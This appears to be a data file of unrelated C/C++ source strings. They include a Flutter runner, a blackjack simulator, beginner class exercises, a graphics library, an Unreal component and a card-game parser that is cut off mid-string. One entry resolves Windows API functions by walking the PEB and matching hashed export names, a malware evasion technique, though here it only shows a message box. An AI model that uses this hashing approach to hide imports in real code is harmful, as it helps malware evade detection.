    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"product_project\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Players_and_Dealer.h\"\r\n\r\n// 1. Non-CardCounting Player\r\n\r\n// Set Initial Balance\r\nPlayer::Player(int initial_balance) : sum(0), is_busted(false), balance(initial_balance) {}\r\n\r\n// When a player receives new card, AddCard() is called\r\nvoid Player::AddCard(int card) {\r\n    cards.push_back(card);\r\n\r\n    UpdateSum();\r\n}\r\n\r\n// Calculate the sum of card\r\nvoid Player::UpdateSum() {\r\n    sum = 0;\r\n    int ace_count = 0;\r\n\r\n    for (int card : cards) {\r\n        if (card == 1)\r\n            ace_count++;\r\n\r\n        sum += (card > 10) ? 10 : card;\r\n    }\r\n    while (ace_count > 0 && sum + 10 <= 21) {\r\n        sum += 10;\r\n        ace_count--;\r\n    }\r\n\r\n    is_busted = (sum > 21);\r\n}\r\n\r\n// Current card sum\r\nint Player::GetSum() const { return sum; }\r\n\r\n// if sum > 21 -> Bust\r\nbool Player::IsBusted() const { return is_busted; }\r\n\r\n// Print all cards which the player has\r\nvoid Player::PrintCards() const {\r\n    cout << \"Cards: \";\r\n    for (int card : cards) cout << card << \" \";\r\n    cout << \"(Sum: \" << sum << \")\" << endl;\r\n}\r\n\r\n// Adjust the balance which the player has\r\nvoid Player::AdjustBalance(int amount) {\r\n    balance += amount;\r\n}\r\n\r\n// return balance\r\nint Player::GetBalance() const {\r\n    return balance;\r\n}\r\n\r\n// 2. Dealer\r\nDealer::Dealer() : Player() {}\r\n\r\n// Decide whether the dealer hits\r\n// sum >= 17 -> Stand | sum < 17 -> Hit\r\nbool Dealer::DecideHit() {\r\n    return sum < 17;\r\n}\r\n\r\n// 3. CardCountingPlayer\r\nCardCountingPlayer::CardCountingPlayer(int initial_balance, int total_cards)\r\n    : Player(initial_balance), total_cards(total_cards), card_drawn(total_cards, false) {}\r\n\r\n// Indicate card usage\r\nvoid CardCountingPlayer::MarkCardDrawn(int index) {\r\n    card_drawn[index] = true;\r\n}\r\n\r\n// Calculate Probability\r\ndouble CardCountingPlayer::Probability(int target_value) {\r\n    int remaining_target = 0;\r\n    int total_remaining = 0;\r\n\r\n    for (int i = 0; i < total_cards; i++) {\r\n        if (!card_drawn[i]) {\r\n            total_remaining++;\r\n\r\n            if ((i % 13 + 1) == target_value)\r\n                remaining_target++;\r\n        }\r\n    }\r\n    return static_cast<double>(remaining_target) / total_remaining;\r\n}\r\n\r\n// sum >= 17 -> Stand\r\n// sum < 17 && Probability > 0.2 -> Hit\r\nbool CardCountingPlayer::DecideHit() {\r\n    if (sum >= 17)\r\n        return false;\r\n\r\n    return Probability(10) > 0.2;\r\n}",
    "// #include<iostream>\n// using namespace std;\n// class one\n// {\n//     public:\n//     int a;\n//     private:\n//     int b;\n//     protected:\n//     int c;\n//     public:\n//     void showvalue()\n//     {\n//         cout<<b<<endl;\n//         cout<<c<<endl;\n//     }\n//     void getvalue()\n//     {\n//         b=20;\n//         c=30;\n//     }\n// };\n// int main()\n// {\n//     one o;\n//     o.a=10;\n//     o.getvalue();\n//     o.showvalue();\n    \n//     cout<<o.a;\n    \n//     return 0;\n// }\n\n\n\n// ACCESS SpeciFIER\n\n\n// #include<iostream>\n// using namespace std;\n// class one\n// {\n//     public:\n//     int a;\n//     private:\n//     int b;\n//     protected:\n//     int c;\n//     public:\n//     void shownumber()\n//     {\n//         cout<<b;\n//     }\n//     void getnumber()\n//     {\n//         b=10; c=30;\n//     }\n    \n// };\n// class two:public one\n// {\n//     public:\n//     void getnumber()\n//     {\n//         c=40;\n//     }\n//     void shownumber()\n//     {\n//         cout<<c;\n//     }\n\n// };\n// int main()\n// {\n//     two t;\n//     t.getnumber();\n//     t.shownumber();\n//     return 0;\n// }\n\n// gatter and SETTER \n\n\n// #include<iostream>\n// using namespace std;\n// class one\n// {\n//     public:\n//     string name;\n//     int age;\n//     string id;\n//     public:\n//     void setname(string name)\n//     {\n//         this->name=name;\n//     }\n//     string getname()\n//     {\n//         return name;\n//     }\n    \n//     void setage(int age)\n//     {\n//         this->age=age;\n//     }\n//     int getage()\n//     {\n//         return age;\n//     }\n//     void setid(string id)\n//     {\n//         this->id=id;\n//     }\n//    string getid()\n//     {\n//         return id;\n//     }\n// };\n// int main()\n// {\n//     one o;\n//     string name;\n//     cout<<\"Enter a name\";\n//     cin>>name;\n//     o.setname(name);\n//     string id;\n//     cout<<\"Enter a id \";\n//     cin>>id;\n//     o.setid(\"id\");\n//     int age;\n//     cout<<\"Enter an age\";\n//     cin>>age;\n//     o.setage(age);\n\n//     cout<<o.getname()<<endl;\n//     cout<<o.getage()<<endl;\n//     cout<<o.getid()<<endl;\n// }\n\n\n\n// Friend function is the specifier its access all private data and   for creating declear with in the class with frds key word anbd after programeer that frds function for divfrd key is not key for calling frd function object is not without object with call frd function\n\n\n// // /FRIEND FUNCTION ???????????\n\n//W.A.P\n\n\n// #include<iostream>\n// using namespace std;\n// class toy\n// {\n//     private:\n//     int arr[10];\n//     public:\n//     void getvalue()\n//     {\n//         int i;\n//         cout<<\"Enter the number\";\n//         for(i=0;i<5;i++)\n//         {\n//             cin>>arr[i];\n//         }\n//     }\n//     friend  void findmax(toy&t);\n//     friend void findmin(toy&t);\n// };\n// void findmax(toy&t)\n// {\n//     int i,max;\n//     max=t.arr[0];\n//     for(i=0;i<5;i++)\n//     {\n//         if(max<t.arr[i])\n//         {\n//             max=t.arr[i];\n//         }\n        \n//     }cout<<\"MAx\"<<max;\n// }\n// void findmin(toy&t)\n// {\n//     int i,min;\n//     min=t.arr[0];\n//     for(i=0;i<5;i++)\n//     {\n//         if(min>t.arr[i])\n//         {\n//             min=t.arr[i];\n//         }\n        \n//     }cout<<\"min\"<<min<<endl;\n// }\n// int main()\n// {\n//     toy t;\n//     t.getvalue();\n//     findmax(t);\n//     findmin(t);\n//     return 0;\n// }\n\n\n\n\n// #include<iostream>\n// using namespace std;\n// class complex\n// {\n//    int a,b;\n//    public:\n//    void setnumber(int n1,int n2)\n//    {\n//     a=n1;\n//     b=n2;\n//    } \n//    friend complex sumcomplex(complex o1,complex o2);\n//    void printnumber(complex c4)\n//    {\n//     cout<<\"Your number is\"<<c4.a<<\" + \"<<c4.b<<\"i\"<<endl;\n//    }\n   \n\n// };\n//  complex sumcomplex(complex o1,complex o2)\n// {\n//     complex o3;\n//     // cout<<\"hellooooooo\"<<o1.a+o2.a;\n//     // cout<<\"hellooooooo\"<<o1.b+o2.b;\n//   // o3. setnumber((o1.a+o2.a),(o1.b+o2.b));\n//   o3.a=o1.a+o2.a;\n//   o3.b=o1.b+o2.b;\n//   return o3;\n// }\n\n// int main()\n// {\n//     complex c1,c2,c4;\n//     int sum;\n//     c1.setnumber(1,4);\n//     c1.printnumber(c1);\n//     c2.setnumber(5,8);\n//     c2.printnumber(c2);\n//   c4=  sumcomplex(c1,c2);\n  \n//     c1.printnumber(c4);\n//     return 0;\n// }\n\n// w.a.p\n\n#include<iostream>\nusing namespace std;\nclass man\n{\n    int a;\n    int b;\n    public:\n    void sum(int x,int y)\n    {\n        a=x;\n        b=y;\n        cout<<a+b;\n        // return a+b;\n\n    }\n};\nint main()\n{\n    man on;\n    on.sum(10,20);\n    // int p=on.sum(10,20);\n    // cout<<p;\n    return 0;\n}",
    "#include \"PPP/Graph.h\"\n#include \"PPP/Window.h\"\n#include \"PPP/Image_private.h\"\n\n\nnamespace Graph_lib {\n\nShape::~Shape()\n{\n    if (parent_window) {\n        parent_window->detach(*this);\n    }\n}\n\nvoid Shape::draw(Painter& painter) const\n{\n    painter.save();\n    painter.set_line_style(style());\n    // Color must be set after line style so that\n    // setting an invisible color can set the line style to \"no pen\".\n    painter.set_color(color());\n    painter.set_fill_color(fill_color());\n    draw_specifics(painter);\n    painter.restore();\n}\n\nvoid Shape::redraw()\n{\n    if (parent_window)\n        parent_window->draw();\n}\n// does two lines (p1,p2) and (p3,p4) intersect?\n// if se return the distance of the intersect point as distances from p1\ninline pair<double,double> line_intersect(Point p1, Point p2, Point p3, Point p4, bool& parallel) \n{\n    double x1 = p1.x;\n    double x2 = p2.x;\n\tdouble x3 = p3.x;\n\tdouble x4 = p4.x;\n\tdouble y1 = p1.y;\n\tdouble y2 = p2.y;\n\tdouble y3 = p3.y;\n\tdouble y4 = p4.y;\n\n\tdouble denom = ((y4 - y3)*(x2-x1) - (x4-x3)*(y2-y1));\n\tif (denom == 0){\n\t\tparallel= true;\n\t\treturn pair<double,double>(0,0);\n\t}\n\tparallel = false;\n\treturn pair<double,double>( ((x4-x3)*(y1-y3) - (y4-y3)*(x1-x3))/denom,\n\t\t\t\t\t\t\t\t((x2-x1)*(y1-y3) - (y2-y1)*(x1-x3))/denom);\n}\n\n\n//intersection between two line segments\n//Returns true if the two segments intersect,\n//in which case intersection is set to the point of intersection\nbool line_segment_intersect(Point p1, Point p2, Point p3, Point p4, Point& intersection){\n   bool parallel;\n   pair<double,double> u = line_intersect(p1,p2,p3,p4,parallel);\n   if (parallel || u.first < 0 || u.first > 1 || u.second < 0 || u.second > 1) return false;\n   intersection.x = p1.x + u.first*(p2.x - p1.x);\n   intersection.y = p1.y + u.first*(p2.y - p1.y);\n   return true;\n} \n\nvoid Polygon::add(Point p)\n{\n\tint np = number_of_points();\n\n\tif (1<np) {\t// check that thenew line isn't parallel to the previous one\n\t\tif (p==point(np-1)) error(\"polygon point equal to previous point\");\n\t\tbool parallel;\n\t\tline_intersect(point(np-1),p,point(np-2),point(np-1),parallel);\n\t\tif (parallel)\n\t\t\terror(\"two polygon points lie in a straight line\");\n\t}\n\n\tfor (int i = 1; i<np-1; ++i) {\t// check that new segment doesn't interset and old point\n        Point ignored_point{0,0};\n        if (line_segment_intersect(point(np-1),p,point(i-1),point(i),ignored_point))\n\t\t\terror(\"intersect in polygon\");\n\t}\n\t\n\n\tClosed_polyline::add(p);\n}\n\n\nvoid Polygon::draw_specifics(Painter& painter) const\n{\n    if (number_of_points() < 3) error(\"less than 3 points in a Polygon\");\n    Closed_polyline::draw_specifics(painter);\n}\n\nvoid Open_polyline::draw_specifics(Painter& painter) const\n{\n    if (color().visibility() && 1<number_of_points())\t// draw sole pixel?\n        for (int i=1; i<number_of_points(); ++i)\n            painter.draw_line(point(i-1), point(i));\n}\n\nvoid Closed_polyline::draw_specifics(Painter& painter) const\n{\n    painter.draw_polygon(*this);\n}\nvoid Shape::move(int dx, int dy)\n{\n\tfor (unsigned int i = 0; i<points.size(); ++i) {\n\t\tpoints[i].x+=dx;\n\t\tpoints[i].y+=dy;\n\t}\n    redraw();\n}\n\nvoid Lines::draw_specifics(Painter& painter) const\n{\n    if (number_of_points()%2==1) error(\"odd number of points in set of lines\");\n\tif (color().visibility())\n\t\tfor (int i=1; i<number_of_points(); i+=2)\n            painter.draw_line(point(i-1) ,point(i));\n}\n\nvoid Text::draw_specifics(Painter& painter) const\n{\n    painter.set_font(font());\n    painter.set_font_size(font_size());\n    painter.draw_text(point(0), lab);\n}\n\nFunction::Function(std::function<double(double)> f, double r1, double r2, Point xy, int count, double xscale, double yscale)\n// graph f(x) for x in [r1:r2) using count line segments with (0,0) displayed at xy\n// x coordinates are scaled by xscale and y coordinates scaled by yscale\n{\n\tif (r2-r1<=0) error(\"bad graphing range\");\n\tif (count<=0) error(\"non-positive graphing count\");\n\tdouble dist = (r2-r1)/count;\n\tdouble r = r1;\n    for (int i = 0; i<count; ++i) {\n        add(Point{xy.x+int(r*xscale),xy.y-int(f(r)*yscale)});\n\t\tr += dist;\n\t}\n}\nvoid Line::draw_specifics(Painter& painter) const\n{\n    painter.draw_line(point(0), point(1));\n}\n\nvoid Rectangle::draw_specifics(Painter& painter) const\n{\n    painter.draw_rectangle(point(0), w, h);\n}\n\n\nAxis::Axis(Orientation d, Point xy, int length, int n, string lab)\n    :label(Point{0,0},lab),\n    line(xy, d==x ?\n                   Point{xy.x+length, xy.y} :\n                   Point{xy.x, xy.y-length})\n{\n\tif (length<0) error(\"bad axis length\");\n\tswitch (d){\n\tcase Axis::x:\n        {\n\t\t\tif (1<n) {\n\t\t\t\tint dist = length/n;\n\t\t\t\tint x = xy.x+dist;\n                for (int i = 0; i<n; ++i) {\n                    notches.add(Point{x,xy.y},Point{x,xy.y-5});\n\t\t\t\tx += dist;\n\t\t\t}\n\t\t}\n\t\t// label under the line\n\t\tlabel.move(length/3,xy.y+20);\n\t\tbreak;\n\t}\n\tcase Axis::y:\n        {\n\t\t\tif (1<n) {\n\t\t\tint dist = length/n;\n\t\t\tint y = xy.y-dist;\n            for (int i = 0; i<n; ++i) {\n                notches.add(Point{xy.x,",
    "// Fill out your copyright notice in the Description page of Project Settings.\r\n\r\n\r\n#include \"FloatingComponent.h\"\r\n#include \"Engine.h\"\r\n\r\n// Sets default values for this component's properties\r\nUFloatingComponent::UFloatingComponent()\r\n{\r\n\t// Set this component to be initialized when the game starts, and to be ticked every frame.  You can turn these features\r\n\t// off to improve performance if you don't need them.\r\n\tPrimaryComponentTick.bCanEverTick = true;\r\n\r\n\t// ...\r\n}\r\n\r\n\r\n// Called when the game starts\r\nvoid UFloatingComponent::BeginPlay()\r\n{\r\n\tSuper::BeginPlay();\r\n\r\n\t// ...\r\n\t\r\n}\r\n\r\n// Called every frame\r\nvoid UFloatingComponent::TickComponent(float DeltaTime, ELevelTick TickType, FActorComponentTickFunction* ThisTickFunction)\r\n{\r\n\tSuper::TickComponent(DeltaTime, TickType, ThisTickFunction);\r\n\r\n\tAActor* popandau = GetOwner();\r\n\tFVector currentLocation = popandau->GetActorLocation();\r\n\r\n\tif (up == true) {\r\n\t\tif (currentLocation.Z < 0) {\r\n\t\t\tFVector nextLocation = currentLocation;\r\n\t\t\tnextLocation.Z += 5;\r\n\t\t\tpopandau->GetRootComponent()->SetWorldLocation(nextLocation);\r\n\t\t}\r\n\t\telse {\r\n\t\t\tup = false;\r\n\t\t}\r\n\t}\r\n\telse {\r\n\t\tif (currentLocation.Z > -100) {\r\n\t\t\tFVector nextLocation = currentLocation;\r\n\t\t\tnextLocation.Z -= 5;\r\n\t\t\tpopandau->GetRootComponent()->SetWorldLocation(nextLocation);\r\n\t\t}\r\n\t\telse {\r\n\t\t\tup = true;\r\n\t\t}\r\n\t}\r\n}\r\n\r\n",
    "#include<stdio.h>\r\nvoid menu (); // I define prototypes here\r\nint min(int, int, int); // I tried first with two values than changed into 3 values\r\nint max(int,int, int);\r\nint square(int);\r\nint cube(int);\r\nint absolute(int);\r\n\r\n\r\nint main () {\r\n\tint choose=0,x,y,z;\r\n\tmenu();\r\n\tprintf(\"Choose a number between 1 and 5: \");\r\n\tscanf(\"%d\", &choose);\r\n\tprintf(\"\\n\\n\");\r\n\tswitch(choose) {\t// Switch case was easier to create and define what should be done step by step\r\n\t\t\r\n\t\tcase 1: printf(\"Enter three numbers:\");\t//Choose 3 values to make a bit difficult\r\n\t\t\t\tscanf(\"%d%d%d\", &x, &y, &z);\t\r\n\t\t\t\tprintf(\"Min:%d\\n\", min(x,y,z));\r\n\t\tbreak; \r\n\t\tcase 2: printf(\"Enter three numbers:\");\r\n\t\t\t\tscanf(\"%d%d%d\", &x, &y, &z);\r\n\t\t\t\tprintf(\"Max:%d\\n\", max(x,y,z));\r\n\t\tbreak;\r\n\t\tcase 3:printf(\"Enter a number:\");\r\n\t\t\t\tscanf(\"%d\", &x);\r\n\t\t\t\tprintf(\"square:%d\\n\", square(x));\r\n\t\tbreak;\r\n\t\tcase 4:printf(\"Enter a number:\");\r\n\t\t\t\tscanf(\"%d\", &x);\r\n\t\t\t\tprintf(\"cube:%d\\n\", cube(x));\r\n\t\tbreak;\r\n\t\tcase 5:printf(\"Enter a number:\");\r\n\t\t\t\tscanf(\"%d\", &x);\r\n\t\t\t\tprintf(\"Absolute value:%d\\n\", absolute(x));\r\n\t\tbreak;\r\n\t\tdefault:printf(\"You choose an invalid value\");\r\n\t\r\n\t}\r\n\t\r\n\treturn 0;\r\n}\r\n\r\nvoid menu () {\r\n\tprintf(\"\\n\");\r\n\tprintf(\"***************\\n\");\r\n\tprintf(\"---------------\\n\");\r\n\tprintf(\"******MENU*****\\n\");\r\n\tprintf(\"---------------\\n\\n\");\r\n\tprintf(\"1-Min\\n\");\r\n\tprintf(\"2-Max\\n\");\r\n\tprintf(\"3-Square\\n\");\r\n\tprintf(\"4-cube\\n\");\r\n\tprintf(\"5-absolute value\\n\");\r\n\r\n\r\n}\r\nint min (int x, int y, int z){\r\n\r\nif(x<y && x<z) { // AND value to make smaller steps\r\n\treturn x;\r\n}else if(y<x && y<z){\r\n\treturn y;\r\n}else(z<x && z<y);{\r\n\treturn z;\r\n} \r\n}\r\nint max (int x, int y, int z){\r\n\r\nif(x>y && x>z) { // AND value to make smaller steps\r\n\treturn x;\r\n}else if(y>x && y>z){\r\n\treturn y;\r\n}else(z>x && z>y);{\r\n\treturn z;\r\n}\r\n}\r\nint square (int x){ // with return the problems would be easier calculated by cube and square\r\n\r\nreturn x*x;\r\n}\r\n\r\nint cube (int x) {\r\n\treturn x*x*x;\t\r\n}\r\nint absolute(int x) { \r\n\tif(x<0) {\r\n\t\treturn x*(-1); // because |-x| value we need to calculate nagative values with -1\t\r\n\t}else {\r\n\t\treturn x; // positive value remains the same\r\n\t}\r\n}\r\n\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//\n// Created by aashik on 29/12/24.\n//\n\n#include <Messenger/sender.h>\n\nusing namespace Messenger;\nSender::Sender(const std::string& memory_name, const std::string& key) : Messenger(memory_name, key){\n\n    shm_fd = shm_open(SHM_NAME, O_CREAT | O_RDWR, 0666);\n    if (shm_fd == -1)\n        throw std::runtime_error(\"shm_open failed.\");\n\n    if (ftruncate(shm_fd, SHM_SIZE) == -1)\n        throw std::runtime_error(\"ftruncate failed.\");\n\n    ptr = mmap(nullptr, SHM_SIZE, PROT_WRITE, MAP_SHARED, shm_fd, 0);\n    if (ptr == MAP_FAILED)\n        throw std::runtime_error(\"mmap failed.\");\n\n    sem = sem_open(SEM_NAME, O_CREAT, 0666, 0);\n    if (sem == SEM_FAILED)\n        throw std::runtime_error(\"sem_open failed.\");\n}\n\nvoid Sender::putMessage(const std::string &message) {\n    std::strncpy(static_cast<char*>(ptr), message.c_str(), SHM_SIZE);\n    sem_post(sem);\n}\n\nSender::~Sender() {\n    munmap(ptr, SHM_SIZE);\n    close(shm_fd);\n    sem_close(sem);\n    shm_unlink(SHM_NAME);\n    sem_unlink(SEM_NAME);\n}\n",
    "#include <Windows.h>\n#include <stdio.h>\n#include <winternl.h>\n\n\n#define INITIAL_SEED\t7\n\nUINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)\n{\n\tSIZE_T Index = 0;\n\tUINT32 Hash = 0;\n\tSIZE_T Length = lstrlenA(String);\n\n\twhile (Index != Length)\n\t{\n\t\tHash += String[Index++];\n\t\tHash += Hash << INITIAL_SEED;\n\t\tHash ^= Hash >> 6;\n\t}\n\n\tHash += Hash << 3;\n\tHash ^= Hash >> 11;\n\tHash += Hash << 15;\n\n\treturn Hash;\n}\n\n\nUINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)\n{\n\tSIZE_T Index = 0;\n\tUINT32 Hash = 0;\n\tSIZE_T Length = lstrlenW(String);\n\n\twhile (Index != Length)\n\t{\n\t\tHash += String[Index++];\n\t\tHash += Hash << INITIAL_SEED;\n\t\tHash ^= Hash >> 6;\n\t}\n\n\tHash += Hash << 3;\n\tHash ^= Hash >> 11;\n\tHash += Hash << 15;\n\n\treturn Hash;\n}\n\n\n//macros used to make the code neater & cleaner\n#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))\n#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))\n\n\n// Junkins One At A Time Hashing User32.dll Algorithm 0x81E3778E\n// Junkins One At A Time Hashing MessageBoxA Algorithm 0xF10E27CA\n\n\n#define USER32DLL_HASH\t\t0x81E3778E\n#define MessageBoxA_HASH\t0xF10E27CA\n\nFARPROC CustomGetProcProcess(IN HMODULE hModule, DWORD dwApiNameHash) {\n\tif (hModule == NULL || dwApiNameHash == NULL)\n\t\treturn NULL;\n\n\tPBYTE pBase = (PBYTE)hModule;\n\n\n\t// Getting the DOS header and checking the signature\n\tPIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n\tif (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {\n\t\treturn NULL;\n\t}\n\n\t// Getting the NT headers and checking the signature\n\tPIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pImgDosHdr->e_lfanew + pBase);\n\tif (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {\n\t\treturn NULL;\n\t}\n\n\n\t// Getting the optional header\n\tIMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;\n\n\t// Getting the export table\n\tPIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n\n\t// Getting the function name array\n\tPDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n\n\t// Getting the func address array\n\tPDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n\n\t// Getting the func ordinal array\n\tPWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals); // Use PWORD, not PDWORD\n\n\n\tfor (DWORD i = 0; i < pImgExportDir->NumberOfNames; i++) { // Iterate over NumberOfNames\n\t\t// Getting the name of the function\n\t\tCHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n\n\t\t// Getting the address of the function through its ordinal\n\t\tFARPROC pFunctionAddress = (FARPROC)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n\n\t\tprintf(\"[+] Checking Function: %s\\n\", pFunctionName);\n\n\t\t// Searching for the function\n\n\t\tif (dwApiNameHash == HASHA(pFunctionName)) {\n\t\t\tprintf(\"[+] Function found: %s\\n\", pFunctionName);\n\t\t\treturn pFunctionAddress;\n\t\t}\n\t}\n\n\tprintf(\"[-] Function not found.\\n\");\n\treturn NULL;\n}\n\nHMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n\n\tif (dwModuleNameHash == NULL)\n\t\treturn NULL;\n\n#ifdef _WIN64\n\tPPEB\t\t\t\t\tpPeb = (PEB*)(__readgsqword(0x60));\n#elif _WIN32\n\tPPEB\t\t\t\t\tpPeb = (PEB*)(__readfsdword(0x30));\n#endif\n\n\tPPEB_LDR_DATA\t\t\tpLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n\tPLDR_DATA_TABLE_ENTRY\tpDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n\n\twhile (pDte) {\n\n\t\tif (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH) {\n\n\t\t\t// converting `FullDllName.Buffer` to upper case string \n\t\t\tCHAR UpperCaseDllName[MAX_PATH];\n\n\t\t\tDWORD i = 0;\n\t\t\twhile (pDte->FullDllName.Buffer[i]) {\n\t\t\t\tUpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);\n\t\t\t\ti++;\n\t\t\t}\n\t\t\tUpperCaseDllName[i] = '\\0';\n\n\t\t\t// hashing `UpperCaseDllName` and comparing the hash value to that's of the input `dwModuleNameHash`\n\t\t\tif (HASHA(UpperCaseDllName) == dwModuleNameHash)\n\t\t\t\treturn (HMODULE)pDte->Reserved2[0];\n\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\n\t\tpDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n\t}\n\n\treturn NULL;\n}\n\n\n\ntypedef int (WINAPI* fnMessageBoxA)(\n\tHWND   hWnd,\n\tLPCSTR lpText,\n\tLPCSTR lpCaption,\n\tUINT   uType\n\t);\n\n\n\nint main() {\n\t//Load user32.dll\n\n\tif (LoadLibraryA(\"USER32.DLL\") == NULL) {\n\t\tprintf(\"[!] LoadLibraryA Failed With Error : %d \\n\",\n\t\t\tGetLastError());\n\t\treturn 0;\n\t}\n\n\t//Get handle to user32.dll using hash function\n\n\tHMODULE hUser32 = GetModuleHandleH(USER32DLL_HASH);\n\n\n\tif(hUser32 == NULL) {\n\t\tprintf(\"[-] Failed to get handle to User32.dll\\n\");\n\t\treturn -1;\n\t}\n\n\tprintf(\"hey\");\n\t\n\t//Getting msgBox Address using hash function\n\n\tfnMessageBoxA MsgBox = (fnMessageBoxA)CustomGetProcProcess(hUser32, MessageBoxA_HASH);\n\tif (MsgBox == NULL) {\n\t\tprintf(\"[-] Failed to find MessageBoxA Adress\\n\");\n\t\treturn -1;\n\t}\n\n\n\t//Calling msgBox\n\n\tMsgBox(NULL, \"Hello ELB1g\", \"Hello\", MB_OK);\n\n\tprintf(\"Press <Enter> To Quit ... \");\n\tgetchar();\n\treturn 0;\n}\n\n\n\n",
    "//\n// Created by Asus on 07/11/2024.\n//\n\n#include \"GameCommand.h\"\n\n#include \"KingdomCard.h\"\n#include \"Jeux.h\"\n#include \"Reserve.h\"\n#include \"Player.h\"\n#include \"Plateau.h\"\n#include <fstream>\n#include <iomanip>\n#include \"TreasureCard.h\"\n#include \"VictoryCard.h\"\n#include <algorithm>\n\n\nvoid GameCommand::getInput(Jeux& j,Phase phase,bool* exitOption,std::string* cardNameOption,std::string* otherInput) {\n    while (true) {\n        std::cout << \"> \";\n        std::string commande;\n        std::getline(std::cin, commande);\n\n        // Normalisation de la commande\n        commande = normalizeCommand(commande);\n\n        // V\u00e9rification des commandes communes\n        if (commande.find(\"HELP \") == 0) {\n            handleHelp(commande.substr(5), j);\n            continue;\n        }if (commande.find(\"SELL \") == 0)\n        {\n            handleSell(commande.substr(5), j, phase);\n            continue;\n        }if(commande.find(\"BUY \") == 0){\n            handleBuy(commande.substr(4), j, phase);\n            break;\n        }\n        if(commande.find(\"PLAY \") == 0){\n            handlePlay(commande.substr(5), j, phase);\n            break;\n        }if(commande.find(\"PICK \") == 0)\n        {\n            if(cardNameOption==nullptr)\n            {\n                alert(\"Commande indisponible\");\n                continue;\n            }\n            *cardNameOption=handlePick(commande.substr(5), j);\n            break;\n        }\n        if (commande == \"INFO\") {\n            handleInfo(j);\n            continue;\n        }\n        if (commande == \"END\")\n        {\n            if (exitOption==nullptr) {\n                alert(\"vous ne pouvez pas terminer le tour ou l'action en cours\");\n                continue;\n            }\n            *exitOption = true;\n            break;\n        }\n        if(otherInput!=nullptr)\n        {\n            *otherInput=commande;\n            break;\n        }\n        alert(\"Commande non reconnue. Essayez 'help [nomCarte]', 'pick [nomCarte]',play [nomCarte],buy[nomCarte] ou 'end'.\" );\n    }\n}\n\nvoid GameCommand::handleHelp(const std::string& nomCarte, const Jeux& j) {\n    Plateau& plateau = j.getPlateau();\n    auto it = plateau.getReserve().find(normalize(nomCarte));\n    if (it != plateau.getReserve().end()) {\n        Card* card = it->second.getCard();\n        if (auto* treasure = dynamic_cast<TreasureCard*>(card)) {\n            treasure->details();\n        } else if (auto* kingdom = dynamic_cast<KingdomCard*>(card)) {\n            